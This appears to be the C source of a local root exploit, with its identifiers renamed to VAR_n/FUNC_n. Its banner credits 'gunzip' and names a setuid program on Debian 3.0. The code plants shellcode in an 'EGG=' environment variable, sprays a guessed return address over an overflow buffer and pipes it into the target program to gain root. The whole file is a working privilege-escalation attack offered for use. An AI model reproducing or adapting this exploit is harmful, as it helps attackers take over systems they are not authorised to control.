
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (char*) ;
 char* VAR_4 ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,char*,int) ;
 int FUNC_3 (char*,int,int) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*) ;
 char* VAR_5 ;
 int FUNC_6 (char*,int,char*,char*,char*) ;
 unsigned long VAR_6 ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*) ;

FUNC_9(int VAR_7, char *VAR_8[])
{
 char VAR_9[VAR_0];
 char VAR_10[VAR_3];
 int VAR_11, VAR_12 ;
 unsigned long VAR_13 ;
 unsigned long VAR_14 = (unsigned long) &VAR_14 ;
 FUNC_4("Local (possibly) root exploit for /usr/bin/KATAXWR (leksbot)\n"
        "tested on Debian 3.0 - usage: ./ex [offset] - by gunzip\n");
 if ( VAR_8[1] ) VAR_12 = FUNC_0( VAR_8[1] ); else VAR_12 = VAR_1 ;
 VAR_13 = VAR_14 + VAR_12 ;
 FUNC_3( VAR_4, 0x00, VAR_3 );
 FUNC_3( VAR_9, 0x00, VAR_0 );
 FUNC_3( VAR_10, 0x41, VAR_3 );
 FUNC_2( &VAR_10[ VAR_3 - FUNC_7( VAR_5 ) - 1 ], VAR_5, FUNC_7( VAR_5 ));
 FUNC_2( VAR_10, "EGG=", 4 );
 VAR_10[ VAR_3 - 1 ] = 0 ;
 FUNC_5( VAR_10 );
  for ( VAR_11=0; VAR_11 < VAR_0 ; VAR_11 += 4 ) *( unsigned long *)&VAR_9[ VAR_11 ] = VAR_13;
 *( unsigned long *)&VAR_9[ VAR_0 - 4 ] = 0x00000000 ;
 if (!(VAR_13&0xff)||!(VAR_13&0xff00)||!(VAR_13&0xff0000)||!(VAR_13&0xff000000)) {
  FUNC_4("Return address contains null byte(s), change offset and retry.\n");
  FUNC_1( -1 );
 }
 FUNC_4( "retaddr=0x%.08x offset=%d len=%d\n", (unsigned int)VAR_13, VAR_12, FUNC_7( VAR_9 ));
 FUNC_6 ( VAR_4, VAR_3 - 4, " echo '%s' | %s", VAR_9, VAR_2 );
 FUNC_8( VAR_4 );
}
